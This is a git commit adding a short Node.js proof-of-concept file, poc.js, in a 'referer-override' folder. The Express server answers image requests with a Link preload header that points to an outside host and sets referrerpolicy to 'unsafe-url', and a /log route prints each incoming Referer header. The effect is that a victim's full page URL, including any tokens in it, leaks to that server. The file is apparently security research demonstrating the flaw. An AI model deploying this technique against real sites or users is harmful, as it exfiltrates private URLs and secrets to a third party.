2e537c043cf5e65a195ead4aeb0aab79ce622786
AmirMohammad Safari <amirmsafari@icloud.com>
2025-05-10 22:12:07 +0330

    Create poc.js

---
+++ referer-override/poc.js
@@ -0,0 +1,18 @@
+const express = require('express');
+const app = express();
+const port = 9999;
+const path = require('path');
+
+app.get('/image.jpg', (req, res) => {
+    res.setHeader('Link','<https://thezodd.com/poc/log>;rel="preload"; as="image"; referrerpolicy="unsafe-url"');
+    res.sendFile(path.join(__dirname, 'logo.jpg'));
+});
+
+app.get('/log', (req, res) => {
+    console.log(req.headers['referer']);
+    res.send('Hi!');
+});
+
+app.listen(port, () => {
+    console.log(`Server running at http://localhost:${port}`);
+});
